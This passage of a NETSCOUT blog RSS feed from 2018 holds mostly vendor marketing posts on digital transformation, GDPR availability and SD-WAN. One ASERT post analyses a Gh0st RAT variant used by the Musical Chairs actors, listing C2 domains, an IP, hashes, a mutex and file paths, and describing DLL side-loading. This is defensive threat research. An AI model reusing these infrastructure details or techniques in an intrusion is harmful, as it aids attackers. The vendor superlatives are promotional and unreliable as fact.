  <description>Online options, digital wallets, and proximity technology are just a few of the ways the retail shopping landscape is being radically altered. Digital transformation (DX) is well and fully underway in the retail world, changing the way shoppers shop and retailers sell. More and more retailers are taking advantage of cross-channel connections to dramatically improve the customer...</description>
  <content:encoded><![CDATA[<p>Online options, digital wallets, and proximity technology are just a few of the ways the retail shopping landscape is being radically altered. Digital transformation (DX) is well and fully underway in the retail world, changing the way shoppers shop and retailers sell. More and more retailers are taking advantage of cross-channel connections to dramatically improve the customer experience.&nbsp;</p>

<p>Digital technologies, such as the Internet of Things (IoT), are helping to reimagine the in-store experience by connecting with customers, collecting and interpreting data in real-time and then delivering personalized pricing, promotions, and recommendations.&nbsp;Retailers can harness the proximity capabilities of smartphones and store beacons to push coupons, special offers, and other messages directly to customers when they pass a store front or enter through the premises.</p>

<p>This new personalized way of customer engagement is precisely what millennials are clamoring for, which is fueling the push to transform the retail experience as we know it. While this sea change is taking place in the retail sector, surprisingly only 23 percent of retailers believe their industry is particularly susceptible to changing business models, according to a recent survey sponsored by NETSCOUT. This disconnect indicates a need by many retailers to better understand the numerous changes taking place today across the industry in order to take full advantage of DX – and meet the increasingly competitive demands of a complex and dynamic marketplace.</p>

<p><strong>IT’s Critical Role in Supporting Retail DX</strong></p>

<p>As new digital channels have proliferated, retail IT is faced with the increasingly difficult challenge of delivering a great consumer experience - which translates to end-to-end availability, fast connections, and reliable data delivery. Reaching the market quickly with products and services is imperative. This need for speed is reflected in the NETSCOUT survey, which found 52 percent of retail respondents indicating the importance of reaching the market as quickly as possible.</p>

<p>Conversely, downtime or degradation on the network or with applications can directly impact the bottom line. Issues range from point-of-sale, where employees are unable to authorize credit cards or provide gift cards, to the inability to complete an online transaction when a retailer’s distributed inventory management system goes offline. Additional vulnerabilities include maintaining full Payment Card Industry (PCI) compliance of sensitive customer financial information over the network, assuring the quality of voice over IP (VoIP) and collaboration services to stores, and ensuring call centers are always available to customers.</p>

<p>Obviously, as retail IT environments become far more complex, and the level of data-intensive functionality expands, performance degradations will occur. As the service delivery path enlarges, the likelihood of database errors, quality-of-service (QoS) misconfigurations, DNS issues, failed micro-services and more grow. For IT to stay ahead of these issues before they become business problems requires an understanding of all the service interdependencies and relationships. This means having visibility of the entire IT environment.</p>

<p>For retail organizations, NETSCOUT solutions deliver real-time, actionable intelligence to identify and resolve network service disruptions, allowing them to confidently exploit new digital innovations and provide a seamless and targeted customer experience. &nbsp;One of the major keys to DX success is the ability to achieve business assurance. NETSCOUT Business Assurance, which is a powerful combination of service assurance, cybersecurity, and business intelligence solutions, enables retail IT to control and manage chaos in production environments. The results are high levels of availability, reliability, and responsiveness of digital services – making it possible to deliver highest quality customer experience.</p>

<p>For a more in-depth look at how DX is impacting the retail industry, <a href="https://www.netscout.com/sites/default/files/2017-10/NETSCOUT_WP_DX_Retail.pdf">download the NETSCOUT white paper, <em>Assuring the Enterprise in the Digital Era – Retail</em></a>.</p>

<p><em>~Written by David Pitlik,&nbsp;Content Creator, Speechwriter, Technology Consultant&nbsp;</em></p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/enterprise">Enterprise</category>
    <enclosure url="http://localhost:7996/sites/default/files/DX_Blog_Banner_Retail.jpg" length="96888" type="image/jpeg"/>
    <guid isPermaLink="false">1470075e-2a12-41de-9b08-8bfc34cf2eed</guid>
    <pubDate>Wed, 21 Feb 2018 17:09:56 -0500</pubDate>
    <source url="http://localhost:7996/full-blogs-2018.xml">NETSCOUT Blogs</source>
    <dc:creator>NETSCOUT</dc:creator>
    </item>
<item>
  <title>GDPR is Explicit About Protecting Availability</title>
  <link>http://localhost:7996/blog/gdpr-availability-protection</link>
  <description>Scheduled to take effect on 25 May 2018, the General Data Protection Regulation (GDPR) calls for unprecedented changes in the way organizations collect, process and protect the personal data of EU citizens. With all the information and talk about GDPR, there are a couple misconceptions that I have come across when speaking to people. The first is that GDPR requirements are only...</description>
  <content:encoded><![CDATA[<p>Scheduled to take effect on 25 May 2018, the General Data Protection Regulation (GDPR) calls for unprecedented changes in the way organizations collect, process and protect the personal data of EU citizens.</p>

<p>With all the information and talk about GDPR, there are a couple misconceptions that I have come across when speaking to people.</p>

<p>The first is that GDPR requirements are only limited to organizations physically located in the EU. That is not true. GDPR explicitly applies to ‘any’ business collecting or processing EU citizen personal data, whether directly, or indirectly as a third-party.  This essentially means GDPR is a worldwide regulation that impacts many different verticals such as retail, healthcare, and finance just to name a few</p>

<p>The other misconception is that GDPR is only about protecting “data.” This is totally understandable as it’s the name of regulation! But again, not true.</p>

<p>GDPR is very explicit when it comes to also protecting ongoing access to that personal data. In other words, “availability” protection. For example:</p>

<h3>GDPR Recital 49</h3>

<p><strong>GDPR Recital 49</strong> defines the appropriateness of processing personal data within security solutions for the purposes of “ensuring network and information security.” It goes further: “This could, for example, include preventing unauthorised access to electronic communications networks and malicious code distribution and stopping ‘<strong>denial of service’</strong> attacks and damage to computer and electronic communication systems.”</p>

<p><strong>GDPR Article 32</strong></p>

<p><strong>Article 32</strong> calls for “the ability to ensure the ongoing confidentiality, integrity, <strong>availability</strong> and resilience of processing systems and services”, and more “the ability to restore the <strong>availability </strong>and access to personal data in a timely manner”.</p>

<p>GDPR rightly points out the need for availability protection. <a href="https://www.netscout.com/what-is-ddos">DDoS attacks</a> are the biggest threat to any organization’s network and/or online business services. And this threat is getting worse. According to <a href="https://www.netscout.com/threatreport">NETSCOUT Arbor’s Annual Worldwide Infrastructure Security Report</a>:</p>

<ul><li>Service providers reported DDoS as being both the top experienced threat and concern for the coming year.</li>
	<li>Enterprises rated ransomware as the top threat but ranked DDoS attacks as a close second.</li>
	<li>The number of attacks has increased dramatically. In 2017 NETSCOUT Arbor’s<a href="https://www.netscout.com/product/atlas-intelligence-feed-aif"> ATLAS</a> observed 7.5 million DDoS attacks vs. 6.8 million in 2016.</li>
	<li>The complexity of these attacks is also increasing. 48% of enterprise survey respondents experienced multi-vector DDoS attacks. That’s up 20% from last year.</li>
	<li>There was also a 30% increase in the number of enterprises that experienced application-layer attacks in 2017.</li>
</ul><p>NETSCOUT Arbor helps you meet the availability protection requirements of GDPR.</p>

<p>NETSCOUT Arbor offers the industry’s most comprehensive <a data-entity-substitution="canonical" data-entity-type="node" data-entity-uuid="3c65b768-de6f-46c2-96e7-23967ddc1287" href="http://localhost:7996/products/arbor-ddos-attack-protection" title="DDoS Attack Protection Products ">DDoS protection solution</a> — a fully integrated, intelligently automated combination of in-cloud and on-premises DDoS (and advanced threat) protection products and services.</p>

<p>What’s more, <strong>Article 32</strong> calls for “regularly testing, assessing and evaluating the effectiveness” of data protection measures. NETSCOUT Arbor products are automatically and regularly updated with current <a href="https://www.netscout.com/global-threat-intelligence">threat intelligence</a> from ATLAS global visibility and our ASERT security experts.</p>

<p>No one in the industry offers such a comprehensive, integrated DDoS protection solution.</p>

<h3>The Lasting Consequences Of GDPR</h3>

<p>One last misconception. Much attention has been focused on the new levels of fines and the clearly stated right of individuals to compensation as a result of GDPR non-compliance. But it’s important to remember the security practices called for by GDPR will help organizations maintain the trust and confidence of their customers and partners moving forward. Future business success requires protecting personal data and your <a href="https://www.netscout.com/solutions/service-assurance">network and service availability</a> – GDPR or not.</p>

<p>To learn more about how NETSCOUT Arbor DDoS attack protection products and services can help you meet the availability protection requirements of GDPR visit <a href="https://www.netscout.com/data-privacy-and-trust-center" target="_blank&quot;">https://www.netscout.com/data-privacy-and-trust-center</a></p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/security">Security</category>
    <enclosure url="http://localhost:7996/sites/default/files/GDPR%201200x480.jpg" length="898582" type="image/jpeg"/>
    <guid isPermaLink="false">7b12b282-9d1a-4c20-80f5-284f12ed0119</guid>
    <pubDate>Wed, 21 Feb 2018 16:25:01 -0500</pubDate>
    <source url="http://localhost:7996/full-blogs-2018.xml">NETSCOUT Blogs</source>
    <dc:creator>Tom Bienkowski</dc:creator>
    </item>
<item>
  <title>Musical Chairs Playing Tetris</title>
  <link>http://localhost:7996/blog/asert/musical-chairs-playing-tetris</link>
  <description>February 20, 2018: This blog has been amended since it was originally published on February 15, 2018. This version removes the association with the APT group responsible for the Night Dragon campaign that we had incorrectly made. We thank the research team at Palo Alto Networks for graciously bringing this to our attention. Introduction ASERT has discovered new command-and...</description>
  <content:encoded><![CDATA[<p><strong>February 20, 2018: This blog has been amended since it was originally published on February 15, 2018. This version removes the association with the APT group responsible for the Night Dragon campaign that we had incorrectly made. We thank the <a href="https://www.paloaltonetworks.com/threat-research">research team at Palo Alto Networks</a> for graciously bringing this to our attention.</strong></p>

<h2>Introduction</h2>

<p>ASERT has discovered new command-and-control infrastructure controlled by the actors behind the Musical Chairs campaign.&nbsp; The actors are known for the longevity of their C2 domains, reusing them long after they have been identified, and for making use of a popular opened sourced RAT called Gh0st.&nbsp;&nbsp; Uniquely in our observation, they have even embedded a fully-functional version of the game Tetris that will launch only when a special condition is meet.</p>

<h2>Key Findings</h2>

<ul>
	<li>ASERT has discovered a new domain associated with the actors behind the Musical Chairs campaign.</li>
	<li>This long-standing actor is known for maintaining static command-and-control infrastructure such as domains for long periods of time, even when they have been discovered and widely publicized in the community.</li>
	<li>With moderate confidence, ASERT expects this domain to be used in new intrusions.</li>
</ul>

<p><a href="http://malware-unplugged.blogspot.com/2015/01/hunting-and-decrypting-communications.html">Multiple</a> <a href="https://www.sans.org/reading-room/whitepapers/detection/gh0st-dshell-decoding-undocumented-protocols-37032">articles</a> have been written about Gh0st over the years, including this one discussing the <a href="https://researchcenter.paloaltonetworks.com/2015/09/musical-chairs-multi-year-campaign-involving-new-variant-of-gh0st-malware/">Musical Chairs campaign</a>'s use of this RAT.&nbsp; <strong>Using details from that report, ASERT has identified a new sample and more interestingly, a new domain that we have associated with the corresponding actor.</strong> <img src="http://www.netscout.com/sites/default/files/asert-blog/uploads/2018/02/domain_tools_etybh_com.png" /> The sample appears to be delivered via an email according to artifacts provided by <a href="http://www.malware-traffic-analysis.net/2018/01/04/index.html">malware-traffic-analysis</a>, which is consistent with <a href="https://researchcenter.paloaltonetworks.com/2015/09/musical-chairs-multi-year-campaign-involving-new-variant-of-gh0st-malware/">documented tactics for this group</a>.</p>

<p>Gh0st variants are prolific as they can be found in a popular open-source source code repository - this blog provides the basis for our association with the actor.</p>

<h2>Analysis</h2>

<h3>Malware</h3>

<p>Example of this Gh0st's init/login packet (notice 'aaaaabbbbb' which can be used to identify this variant): <img src="http://www.netscout.com/sites/default/files/asert-blog/uploads/2018/02/gh0st_pcap.png" /></p>

<p>Some other behavior of interest &nbsp;observed while reviewing this actor's specimen is they appear to be moving away from BAT and JS files as part of the infection process<a href="#_edn1" name="_ednref1">[i]</a> to using DLL side loading.&nbsp; This is just one sample though, so take this for what it is.&nbsp;&nbsp; As part of the DLL side-loading, they make use of a signed executable to load a DLL which in turn is used to launch the actual Gh0st DLL. They are not the only malware authors who use this trick.</p>

<p>The observed functionality in this sample maps directly to public documentation for Gh0st, so this blog will not rehash that.</p>

<h3>Association No. 1</h3>

<p>Starting with the known C2 servers for this group, we can check to see if the new domain has any ties to them.&nbsp; Two of their C2s were registered back in 2013 and the campaign has been around even longer than that per</p>

<p>Known Domains</p>

<ul>
	<li>yourbroiler[.]com</li>
	<li>meitanjiaoyiwang[.]com</li>
</ul>

<p>New Domain</p>

<ul>
	<li>etybh[.]com</li>
</ul>

<p>Looking at DomainTools, we learn that all three share the same IP, 45.34.148.126, and the same registrar, Jiangsu Bangning &nbsp;Science &amp; Technology Co. LTD. <img src="http://www.netscout.com/sites/default/files/asert-blog/uploads/2018/02/musical_chairs_CNCs.png" /> The newest domain, etybh[.]com, was registered in December of 2017.&nbsp; Looking at PassiveTotal, all three domains appeared to have switched from 98.126.223.218 to 45.34.148.146 sometime in the middle of January 2018.&nbsp; This is our first clue that they are related.</p>

<h3>Association No. 2</h3>

<p>This one comes from looking at behavior when the file is attached to a debugger.</p>

<p>First, let us back up a step.&nbsp; Observing behaviors of our suspected Musical Chairs Gh0st sample via a sandbox, we see that it creates a folder called "Win32Tetris".&nbsp; Let's see if there are any other Gh0st samples that do this as well.&nbsp; Taking a look through ASERT's malware corpus we find this sample, 11fe12bbb479b4562c1f21a74e09b233ed41c41b7c4c0cad73692ff4672fb86a, which also creates that folder.&nbsp; Using clues left by another researcher<a href="#_edn2" name="_ednref2">[ii]</a>, we can confirm that this more recent sample&nbsp;is from the Musical Chairs group due to the C2 and some other characteristics we'll go over.&nbsp; The most promising correlation is that this sample's C2 is <a href="http://www.yourbroiler[.]com">www.yourbroiler[.]com</a> which is a known C2 for this actor.&nbsp;&nbsp;Next, we find similarities from a different dropped file called C:\microsoft\lib\ki\vv.js whose content reads as such:</p>

<p><img src="http://www.netscout.com/sites/default/files/asert-blog/uploads/2018/02/vv_js_snippet.png" /></p>

<p>The content is similar to samples identified back in 2015<a href="#_edn3" name="_ednref3">[iii]</a>, which also used rundll32 to call a <em>mystart</em> method.&nbsp; And, finally, this sample makes use of the same mutex tied to this actor's Gh0st variant: &nbsp;dafewewrw. <u>To summarize the pivot sample</u></p>

<table>
	<tbody>
		<tr>
			<td width="320"><strong>Property</strong></td>
			<td width="298"><strong>Value</strong></td>
		</tr>
		<tr>
			<td width="320">Load the dll via a script file called</td>
			<td width="298">C:\microsoft\lib\ki\vv.js</td>
		</tr>
		<tr>
			<td width="320">Domain</td>
			<td width="298"><a href="http://www.yourbroiler[.]com">www.yourbroiler[.]com</a></td>
		</tr>
		<tr>
			<td width="170">Mutex</td>
			<td width="298">dafewewrw</td>
		</tr>
	</tbody>
</table>

<p>&nbsp; Now that we have confirmed that this sample appears to be a Musical Chairs actor Gh0st variant, let's work the pivot (going to refer to this sample as the "pivot" sample). The pivot sample, when attached to a debugger, will launch what appears to be a fully functional Tetris game (very friendly of them to provide us reverse engineers with a short break):</p>

<p><img src="http://www.netscout.com/sites/default/files/asert-blog/uploads/2018/02/tetris.png" /></p>

<p>The latest sample (the one tied to the new domain, etybh[.]com) also exhibits this same behavior when attached to the debugger.&nbsp; To play the game make sure to not hide the PEB.&nbsp; For what it is worth, after checking out one of the prior samples from 2015<a href="#_edn4" name="_ednref4">[iv]</a>, it exhibited similar behavior; just not a Tetris game.</p>

<p><img src="http://www.netscout.com/sites/default/files/asert-blog/uploads/2018/02/spy_lite.png" /></p>

<h3>Association No. 3</h3>

<p>The final observation is the fact that the payload dropped on the file system as RasTls.dat is in fact an obfuscated DLL file.&nbsp; When looking at the DLL properties the <em>mystart</em> function is exported.&nbsp; Again, <em>mystart</em> is the exported DLL function which the samples back in 2015 called.</p>

<p><img src="http://www.netscout.com/sites/default/files/asert-blog/uploads/2018/02/dll_properties.png" /></p>

<h2>Conclusion</h2>

<p>While it should not surprise us when a long-standing actor switches things up, this specific actor is known for not really changing much.&nbsp; The use of a different Gh0st variant in addition to the new domain may be indicative of additional changes coming or the actor may be just keeping up with the times. Given previously observed behavior, it is likely that this indicator will be used in the campaign for the foreseeable future and ASERT is making it available to enable visibility for the broader security research community.</p>

<p><a href="#_ednref1" name="_edn1">[i]</a> <a href="https://researchcenter.paloaltonetworks.com/2015/09/musical-chairs-multi-year-campaign-involving-new-variant-of-gh0st-malware/">https://researchcenter.paloaltonetworks.com/2015/09/musical-chairs-mult…</a></p>

<p><a href="#_ednref2" name="_edn2">[ii]</a> <a href="https://researchcenter.paloaltonetworks.com/2015/09/musical-chairs-multi-year-campaign-involving-new-variant-of-gh0st-malware/">https://researchcenter.paloaltonetworks.com/2015/09/musical-chairs-mult…</a></p>

<p><a href="#_ednref3" name="_edn3">[iii]</a> <a href="https://researchcenter.paloaltonetworks.com/2015/09/musical-chairs-multi-year-campaign-involving-new-variant-of-gh0st-malware/">https://researchcenter.paloaltonetworks.com/2015/09/musical-chairs-mult…</a></p>

<p><a href="#_ednref4" name="_edn4">[iv]</a> Hash: 50f08f0b23fe1123b298cb5158c1ad5a8244ce272ea463a1e4858d12719b337f</p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/blog-category/asert">ASERT</category>
    <enclosure url="http://localhost:7996/sites/default/files/tetris.png" length="60521" type="image/png"/>
    <guid isPermaLink="false">4833ea69-3893-4839-b2fa-23cea6f4e277</guid>
    <pubDate>Thu, 15 Feb 2018 16:23:40 -0500</pubDate>
    <source url="http://localhost:7996/full-blogs-2018.xml">NETSCOUT Blogs</source>
    <dc:creator>ASERT Team</dc:creator>
    </item>
<item>
  <title>Digital Transformation is Impacting the Public Sector</title>
  <link>http://localhost:7996/blog/digital-transformation-impacting-public-sector</link>
  <description>There’s no question that the public sector frequently trails the private sector when it comes to innovation and the utilization of technology. The sheer size and complexity of most government agencies makes it incredibly difficult to keep up with the latest advancements. That said, the importance of improving services is an ever present driver pushing public sector...</description>
  <content:encoded><![CDATA[<p>There’s no question that the public sector frequently trails the private sector when it comes to innovation and the utilization of technology. The sheer size and complexity of most government agencies makes it incredibly difficult to keep up with the latest advancements. That said, the importance of improving services is an ever present driver pushing public sector organizations around the world to adopt digital transformation (DX) initiatives that offer the promise of vastly enhanced and upgraded capabilities. &nbsp;&nbsp;&nbsp;</p>

<p>Amongst the many services provided by government, perhaps the most important are emergency services. While achieving cost-efficiencies in these services is vital, providing the highest level of reliability is the greatest priority. Certainly every second counts when it comes to an emergency, which places tremendous pressure on contact and communications centers that are the central touchpoint for reporting incidents and coordinating responses. When an emergency occurs, first responders and public safety officials must be rapidly dispatched and fully supported in the field with the necessary level of situational awareness.&nbsp;</p>

<p>The public has a high expectation that when called upon, government emergency services departments will be there and ready to help. This means network and communications availability must be assured. Voice and data systems simply can’t be allowed to fail or degrade, ensuring call center staff is able to provide time-sensitive information to first responders. Of course, the larger the emergency situation, the more taxing network traffic can become, putting a greater burden on IT to maintain always-on capacities of vital infrastructure.</p>

<p>As DX initiatives transform operations centers with increasingly sophisticated UC tools, IT faces the added challenge of managing the quality and performance of converged, multi-channel IT infrastructures that integrate voice over IP (VoIP), chat, data video, and web capabilities. When it comes to life-saving services, IT must maintain a near-perfect level of service delivery for agency staff.</p>

<p>And, of course, government reliance on network performance goes well beyond emergency services. Transformation initiatives are impacting agencies involved with criminal justice, social services, treasury departments and registry of motor vehicles – just to name a few.</p>

<p>All of these government services, whether at the local, regional/state or national level, rely on online systems and processes where reliability is an absolute must. To ensure that reliability, IT has to have an accurate view of the user experience and a system-wide view of all dependencies that could affect any of the unified technologies and capabilities. This means having end-to-end service assurance across all platforms and environments, removing service performance blind spots and allowing IT to quickly triage and resolve a range of issues and ensure every engagement has a positive outcome.</p>

<p>NETSCOUT solutions enable IT to proactively monitor and analyze these inherently complex services in a cost-effective way. As a result, IT is able to optimize infrastructure assets, dramatically reducing CapEx and OpEx spending without compromising the end-user experience of citizens, employees and contractors of government agencies.</p>

<p>In particular, NETSCOUT solutions support the management of UC services for public sector communication and call center environments. NETSCOUT’s vendor independent solutions help government IT organizations to consolidate UC service management for highly complex, multi-location, multi-vendor environments.</p>

<p>For a more in-depth look at how DX is impacting the retail industry, download the NETSCOUT white paper, <em>Assuring the Enterprise in the Digital Era – Public Sector</em>, by clicking <a href="https://www.netscout.com/sites/default/files/2017-10/NETSCOUT_WP_DX_Public_Sector.pdf">here</a>.</p>

<p><em>~Written by David Pitlik,&nbsp;Content Creator, Speechwriter, Technology Consultant&nbsp;</em></p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/enterprise">Enterprise</category>
    <enclosure url="http://localhost:7996/sites/default/files/DX_Blog_Banner_Public_0.jpg" length="100405" type="image/jpeg"/>
    <guid isPermaLink="false">65808245-14fd-4663-9488-3ea8e638b917</guid>
    <pubDate>Wed, 14 Feb 2018 13:33:07 -0500</pubDate>
    <source url="http://localhost:7996/full-blogs-2018.xml">NETSCOUT Blogs</source>
    <dc:creator>NETSCOUT</dc:creator>
    </item>
<item>
  <title>How to Manage Self-Service Provisioning </title>
  <link>http://localhost:7996/blog/how-manage-self-service-provisioning</link>
  <description>Is self-service ubiquitous? Tell that to the state government of New Jersey, where pumping your gas is still against the law. But elsewhere, yes, self-service is one of the cornerstones of digital transformation. According to the National Institute of Standards and Technology (NIST), one of the five essential characteristics of cloud computing is on-demand self-service. But...</description>
  <content:encoded><![CDATA[<p>Is self-service ubiquitous? Tell that to the state government of New Jersey, where pumping your gas is still against the law. But elsewhere, yes, self-service is one of the cornerstones of digital transformation. According to the National Institute of Standards and Technology (NIST), one of the <a href="https://www.nist.gov/news-events/news/2011/10/final-version-nist-cloud-computing-definition-published">five essential characteristics</a> of cloud computing is on-demand self-service.</p>

<p>But with your customers now provisioning and scaling computing power, storage, and network services via portals that are devoid of human interaction, how do you manage it? How do you verify what services have been provisioned and monitor how they’re performing based on the service level agreement (SLA)?</p>

<p>With software-defined networking (SDN), it’s easier than ever before. And more complete, because now monitoring and synthetic diagnostic transactions can be used to understand both the health of the WAN <i>and</i> the health of the premise. It’s a new and improved approach to traffic monitoring and service assurance.</p>

<p>Case in point: verifying self-service provisioning in software-defined WAN (SD-WAN) service.</p>

<p><b>More Accurate Views of On-Premise Traffic Data</b></p>

<p>Your SD-WAN architecture allows you to deploy virtual network functions (VNFs) in a white box with a universal CPE (uCPE) that provide the newest generation of service assurance. These virtual, distributed service assurance functions can collect traffic data and apply policies beyond your WAN to your customer’s premise.&nbsp;</p>

<p>Not only is it easier, faster, and cheaper to deploy service assurance in VNFs at the network edge, but such a system can ingest, process, and report on richer, real-time, packet-level traffic from your core network to customer endpoints. The VNFs can capture session details and long-term packet recording. They aggregate traffic from multiple sources and present real-time views of sessions, conversations, and end-to-end call trace data. They also perform packet analysis and provide network-wide key performance indicators (KPIs). This is a newer, better approach to service assurance with much more accurate views of traffic flow and the customer experience.</p>

<p><b>Real-Time Traffic Verification Across Networks</b></p>

<p>This service assurance solution in the SD-WAN must operate at the speed of today’s digital world. That means up to 100 gigabits per second on a given network segment. That’s possible with behind-the-scenes engineering mastery, using techniques like creative data reduction, multi-threading, deduplication, optimization, and stateful inspection.</p>

<p>The insights on service performance and user experience from the correlated analysis of application, network, and service sessions can give you a clear, end-to-end look at each customer’s self-service provisioning. The data from this expanded view of traffic can be a valuable new analytics input to generate actionable intelligence for IT operations, product and service design, sales and marketing, and other areas for customers as well as service providers.</p>

<p><b>Smarter Data, Higher Automation</b></p>

<p>There’s a lot of network data from multiple sources out there. But if that data isn’t normalized and correlated in context with the monitored application and service delivery infrastructure, you won’t get real-time, actionable insights. So aside from collecting traffic data, your VNF service assurance solution must be able to organize and contextually analyze traffic and application data.</p>

<p>This type of distributed service assurance approach provides another big benefit: it’s virtual and automated. No more truck rolls. For the first time, operators can remotely understand the health of the WAN and the premise. You can probe, monitor, and run synthetic transactions to measure errors, throughput, and other metrics. Service assurance can be orchestrated remotely for your customers from your data center through a broadband gateway to the Internet traffic and the WAN connection to the MPLS traffic in an SD-WAN service.</p>

<p>So if you’re offering SD-WAN service or other SDN solutions, look into stepping up your service assurance approach. With the rising tide of traffic and the increasingly complex interactions and dependencies between network, application, and storage components, the old ways of monitoring traffic are too cumbersome, complex, and time-consuming.</p>

<p>&nbsp;</p>

<p>NETSCOUT provides technologies that <a href="https://www.netscout.com/product/vscout-and-vstream">capture deeper traffic data</a> than ever before across diverse network topologies for service providers and enterprises and <a href="https://www.netscout.com/solutions/smart-data">Smart Data solutions</a> to make it usable.</p>

<p><em>~Written by&nbsp;Gene Knauer. Gene is a senior content marketing writer who works with technology companies in a variety of B2B marketing communications projects.</em></p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/service-provider">Service Provider</category>
    <enclosure url="http://localhost:7996/sites/default/files/2021-01/04/images/network-functions-visibility-virtualization.jpg" length="333158" type="image/jpeg"/>
    <guid isPermaLink="false">d8a57a24-be3e-4cc8-8223-9265960cba2b</guid>
    <pubDate>Wed, 14 Feb 2018 13:00:00 -0500</pubDate>
    <source url="http://localhost:7996/full-blogs-2018.xml">NETSCOUT Blogs</source>
    <dc:creator>NETSCOUT</dc:creator>
    </item>
<item>
  <title>Engaging in a Healthy Transformation</title>
  <link>http://localhost:7996/blog/engaging-healthy-transformation</link>
  <description>Information is literally the lifeblood of nearly every organization. And for the healthcare industry in particular, ensuring the uninterrupted flow of information is absolutely critical for the effective diagnosis and treatment of patients. While digital transformation (DX) has become an imperative across nearly every business sector, no industry is more profoundly impacted...</description>
  <content:encoded><![CDATA[<p>Information is literally the lifeblood of nearly every organization. And for the healthcare industry in particular, ensuring the uninterrupted flow of information is absolutely critical for the effective diagnosis and treatment of patients.&nbsp;</p>

<p>While digital transformation (DX) has become an imperative across nearly every business sector, no industry is more profoundly impacted than healthcare because of the affect these changes are expected to have on the health and well-being of each and every one of us. The transformation that is taking place promises to enhance healthcare service provision - from diagnosis to post-care - while improving the relationship between patients, caregivers, and other stakeholders.</p>

<p>Digital services are already a vital component of healthcare, covering electronic medical records (EMR), electronic health records (EHR), digital imaging, e-prescription services and enterprise resource planning (ERP) systems. As DX initiatives continue to proliferate, many of today’s manual processes will become automated, autonomous, and ultimately more efficient - improving the patient experience and reducing costs.&nbsp;</p>

<p><strong>Disruption to Digital Services is Simply Unacceptable </strong></p>

<p>As wireless (Wi-Fi) connectivity becomes ubiquitous across the healthcare environment, providers are increasingly able to deliver improvements in clinical services. In addition to enabling access to life-critical information such as EMRs and EHRs, Internet of Things (IoT) technologies will support Wi-Fi patient monitoring devices, ‘smart’ beds and remote access to x-rays and scans in real time.</p>

<p>DX holds the potential to completely reimagine many aspects of the daily practice of medical care. By bringing the digital and physical worlds together, the vast amount of data provided will reshape both patient and care team behavior. Of course, integrating digital services with existing clinical processes, infrastructure and tools adds a significant level of complexity. Healthcare IT is under pressure to ensure that networks and applications have the agility and speed to meet the growing needs of all stakeholders. Any disruption to services is simply unacceptable.</p>

<p>As patient outcomes are increasingly dependent on the uninterrupted and secure flow of information to deliver the proper diagnosis and treatment, service assurance is taking center stage. Healthcare IT professionals are seeing the virtue of leveraging traffic data as a means to continuously monitor performance, using real-time actionable insight to assure service delivery and provide comprehensive reporting to different functions within the organization. As digital transformation takes hold across the healthcare industry, IT is able to employ data sources such as synthetic transactions or NetFlow to gain end-to-end visibility - from the physical and virtual data center to the network edge and cloud.&nbsp;</p>

<p><strong>DX Is Helping to Meet Healthcare Expectations </strong></p>

<p>The healthcare industry has taken important steps to foster DX initiatives. The introduction of Health Level 7 (HL-7), an internationally agreed upon set of protocols, is helping to promote global health data interoperability between different computer systems. These standards will facilitate the transmission and exchange of information between healthcare providers, making it easier to deliver a host of critical care services.</p>

<p>As a result, many providers are now improving patient care by adopting a variety of applications that rely on trouble-free, real-time access to information in their IT environment. &nbsp;</p>

<p>Bring-your-own-device (BYOD) initiatives, Wi-Fi expansion, secure email systems, unified communications (UC) and voice-over-IP (VoIP) coupled with telemedicine are all taxing network resource capacity, making service assurance a critical need. To support DX initiatives, healthcare organizations need business analytics powered by smart data that is well-structured, contextual, available in real-time, and based on end-to-end pervasive visibility across the entire healthcare organization. NETSCOUT service assurance solutions provide continuous monitoring of traffic-based data and real-time analytics, enabling healthcare IT to support the critical mission of achieving successful patient outcomes and meeting healthcare expectations.</p>

<p>For a more in-depth look at how DX is impacting the healthcare industry, download the NETSCOUT white paper, <em>Assuring the Enterprise in the Digital Era – Healthcare</em>, by clicking <a href="https://www.netscout.com/sites/default/files/2017-10/NETSCOUT_WP_DX_Healthcare.pdf">here</a>.</p>

<p><em>~Written by David Pitlik,&nbsp;Content Creator, Speechwriter, Technology Consultant&nbsp;</em></p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/enterprise">Enterprise</category>
    <enclosure url="http://localhost:7996/sites/default/files/DX_Blog_Banner_HealthCare.jpg" length="102797" type="image/jpeg"/>
    <guid isPermaLink="false">72fa40b3-3202-4181-b9f0-5d1e459beac7</guid>
    <pubDate>Wed, 07 Feb 2018 16:00:00 -0500</pubDate>
    <source url="http://localhost:7996/full-blogs-2018.xml">NETSCOUT Blogs</source>
    <dc:creator>NETSCOUT</dc:creator>
    </item>
<item>
  <title>SD-WAN changing the game for service and security assurance</title>
  <link>http://localhost:7996/blog/sd-wan-changing-game-service-and-security-assurance</link>
  <description>In British detective shows, a large number of closed-circuit TV (CCTV) cameras in cities across the U.K. are always a reliable source of evidence. But there are inevitable gaps in camera placement, where suspects move about unseen. What does this have to do with network and application service assurance in the age of Software-defined Wide Area Network (SD-WAN)? SD-WAN offers...</description>
  <content:encoded><![CDATA[<p>In British detective shows, a large number of closed-circuit TV (CCTV) cameras in cities across the U.K. are always a reliable source of evidence. But there are inevitable gaps in camera placement, where suspects move about unseen.</p>

<p>What does this have to do with network and application service assurance in the age of Software-defined Wide Area Network (SD-WAN)?</p>

<p>SD-WAN offers service providers a big opportunity: the ability to see and control traffic more effectively through virtual connections and in near real-time ― both on the WAN and Internet connects and beyond them to the endpoints. So there are no more blind spots. You gain full visibility of traffic end-to-end via the deployment of virtual service assurance functions at the network edge.</p>

<h4>The Benefits extending&nbsp;visibility&nbsp;to&nbsp;the&nbsp;premises&nbsp;</h4>

<p>Why should network&nbsp;operators care? Because for starters, as with SD-WAN, it’s going to lower your costs.</p>

<p>Improved visibility will both strengthen an operator’s (SLA), as well as help drive down OpEx by reducing truck rolls.&nbsp;Similarly, the ability to strengthen premise security over an SD-WAN link&nbsp;through enhanced service assurance capabilities in virtual services by increasing&nbsp;visibility.</p>

<p>With such a solution in place for your SD-WAN&nbsp;customers, you’re getting more reliable information, in real-time, on application performance and security events, than ever before. Feeding your information base is traffic data from the data center to the edge and from the edge to the end user’s device.&nbsp;</p>

<p>It’s like installing another CCTV camera, via software, to see deeper into the network in the search for traffic anomalies that can be either threats or inefficiencies. &nbsp;</p>

<h4>How SD-WAN supports&nbsp;new&nbsp;service&nbsp;offerings</h4>

